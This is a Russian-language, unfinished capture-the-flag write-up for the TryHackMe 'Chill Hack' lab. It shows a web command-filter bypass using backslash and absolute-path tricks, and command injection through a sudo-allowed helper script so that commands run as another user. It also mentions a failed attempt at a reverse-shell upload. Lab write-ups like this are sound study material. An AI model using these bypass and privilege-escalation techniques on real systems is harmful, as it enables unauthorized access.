# 🖥️ Отчет по машине: Chill Hack

**Дата:** 2026-05-01
**Платформа:** TryHackMe
**Сложность:** Easy
**Статус:** In progress

---

## 📡 1. Разведка 

Сайт посвящен тематике футбола, очень много страниц
<img width="1266" height="636" alt="Снимок экрана 2026-05-01 в 08 01 34" src="https://github.com/user-attachments/assets/f597399c-051b-4652-9330-ba113138132f" />

поставлю dirsearch для поиска скрытых путей и кредов, и продолжу изучение страниц
К сожалению на стрницах ничего ценного я не нашел, но dirsearch нашел несколько путей, один из них /secret 
<img width="655" height="702" alt="Снимок экрана 2026-05-01 в 08 11 51" src="https://github.com/user-attachments/assets/9d6515d8-7e67-4064-b2fb-960e9e318c5a" />

На странице есть командная строка с разрешенными и запрещенными командами 
Пример: PWD
<img width="1102" height="616" alt="Снимок экрана 2026-05-01 в 08 10 58" src="https://github.com/user-attachments/assets/c74cc0f0-fcd9-40d7-9536-9b4e037f207d" />

Пример: LS
<img width="1271" height="651" alt="Снимок экрана 2026-05-01 в 08 11 21" src="https://github.com/user-attachments/assets/f7b40c46-7f69-4cd9-a8d8-1ebf02f86618" />
Однако этот запрет можно обойти: вот два примера: первый это обратный слэш ```\ls``` и второй это обратиться к нему на прямую```/bin/ls``` (на самом деле способов кратно больше, привел самые простые)
и вот результат: <img width="287" height="104" alt="Снимок экрана 2026-05-01 в 08 20 14" src="https://github.com/user-attachments/assets/49f2c990-2c6e-4854-9e9e-9f47d3410406" />
```
sudo -l
```

```
NOPASSWD: /home/apaar/.helpline.sh
```
```
\cat /home/apaar/.helpline.sh
```
msg2 - это стандартная ошибка которая идет на удаление, сейчас это дает возможность выполнить команды без пароля от пользователя apaar
```
#!/bin/bash echo echo "Welcome to helpdesk. Feel free to talk to anyone at any time!" echo read -p "Enter the person whom you want to talk with: " person read -p "Hello user! I am $person, Please enter your message: " msg $msg 2>/dev/null echo "Thank you for your precious time!"
```
Возможно не понятно, я запрашиваю поддержку от пользователя Апаар без пароля и в сообщение с ошибкой я вставляю код который выполняется от имени Апаар, вот пример:
```
sudo -u apaar /home/apaar/.helpline.sh
```
<img width="689" height="201" alt="Снимок экрана 2026-05-01 в 09 14 54" src="https://github.com/user-attachments/assets/5c51b521-b46e-4e5e-802b-b3b4f054630a" />

Ввожу ```touch /tmp/test.txt``` и проверяю создался ли файл
```
\ls -la /tmp/test.txt
```
да файл создался 
<img width="717" height="142" alt="Снимок экрана 2026-05-01 в 09 15 19" src="https://github.com/user-attachments/assets/48d4b114-2f7d-4487-b0f9-941cc944d93f" />





= Не удачные векторы =
# Попытка изменить index.php - стоило сразу прочитать разрешения файла -rw-r--r-- 1 - кроме рут никто сюда не пишет
# Попытка создать файл в папке secret также не увеначались успехом тк создавать файл я не могу 
# Попытка загрузить файл с реверс шеллом на сайт через свой сервер
